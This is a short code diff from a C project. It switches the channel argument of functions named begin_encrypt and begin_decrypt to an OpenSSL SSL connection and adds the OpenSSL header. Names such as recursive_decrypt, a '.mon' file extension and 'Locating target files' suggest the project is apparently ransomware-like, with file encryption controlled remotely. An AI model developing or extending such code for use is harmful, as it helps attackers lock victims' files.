@@ -31,6 +31,8 @@
 #include "tools.h"
 #include "channel.h"
 
+#include <openssl/ssl.h>
+
 #include "external/badges.h"
 
 char *extension = ".mon";
@@ -145,7 +147,7 @@ static int recursive_decrypt(char *path, char *key, char *iv)
     return 0;
 }
 
-int begin_encrypt(int channel, char *path, char *key, char *iv)
+int begin_encrypt(SSL *channel, char *path, char *key, char *iv)
 {
     send_channel(channel,
                  link_string(process, "Locating target files...\n", 0));
@@ -192,7 +194,7 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
     return 0;
 }
 
-int begin_decrypt(int channel, char *path, char *key, char *iv)
+int begin_decrypt(SSL *channel, char *path, char *key, char *iv)
 {
     send_channel(channel, link_string(process,
                                       "Locating target files...\n", 0));
